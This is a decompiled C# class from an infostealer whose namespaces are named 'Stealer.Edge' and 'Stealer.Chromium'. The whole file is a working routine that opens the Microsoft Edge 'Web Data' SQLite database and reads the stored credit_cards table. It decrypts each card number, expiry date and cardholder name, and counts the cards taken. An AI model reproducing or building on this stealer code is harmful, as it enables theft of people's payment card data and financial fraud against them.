using System;
using System.Collections.Generic;
using System.IO;
using Stealer.Chromium;

namespace Stealer.Edge
{
	// Token: 0x0200002F RID: 47
	internal sealed class CreditCards
	{
		// Token: 0x060000D2 RID: 210 RVA: 0x00007710 File Offset: 0x00005910
		public static List<CreditCard> Get(string sWebData)
		{
			List<CreditCard> result;
			try
			{
				List<CreditCard> list = new List<CreditCard>();
				if (!File.Exists(sWebData))
				{
					result = list;
				}
				else
				{
					SQLite sqlite = SqlReader.ReadTable(sWebData, "credit_cards");
					if (sqlite == null)
					{
						result = list;
					}
					else
					{
						for (int i = 0; i < sqlite.GetRowCount(); i++)
						{
							CreditCard item = default(CreditCard);
							item.sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 4)));
							item.sExpYear = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 3)));
							item.sExpMonth = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 2)));
							item.sName = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 1)));
							Counter.CreditCards++;
							list.Add(item);
						}
						result = list;
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = new List<CreditCard>();
			}
			return result;
		}
	}
}
